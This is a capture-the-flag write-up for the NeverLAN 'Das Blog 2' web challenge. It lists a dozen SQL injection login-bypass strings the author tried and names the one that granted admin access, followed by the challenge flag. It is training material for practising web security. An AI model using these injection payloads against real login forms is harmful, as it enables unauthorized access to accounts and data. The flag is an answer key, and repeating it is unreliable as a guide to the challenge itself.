[Das Blog 2]
---
Question:
---
	Well, we really showed Johnny. It looks like he made some changes... 
	But he still isn't escaping his inputs. Teach him a lesson.
	https://challenges.neverlanctf.com:1130

Answer
---
	1. This is simialr to the first task, but this time you need to include permissions
	2. After several tries:
	1' or 1=1 -- -
	1' or 1=1 -- -; permissions=admin
	1' or 1=1 -- -'and permission='admin'
	1' or 1=1 -- -'AND permission='admin'
	'-0||'and permission='admin'
	'-0||'and permission='admin' 
	1' or 1=1 and permission='admin' - - 
	1' or 1=1 and permission='admin' -- 
	1' or 1=1 AND permission='admin' - - 
	' OR '1'='1' AND permissions='admin'--
	' OR '1'='1' AND permissions='admin'-- 

	3. This one seemed to do the trick "' OR '1'='1' AND permissions='admin'-- "
	4. Credit to snow - thanks mayn!

Flag:
---
	flag{Pwn3d_W1th_SQL}
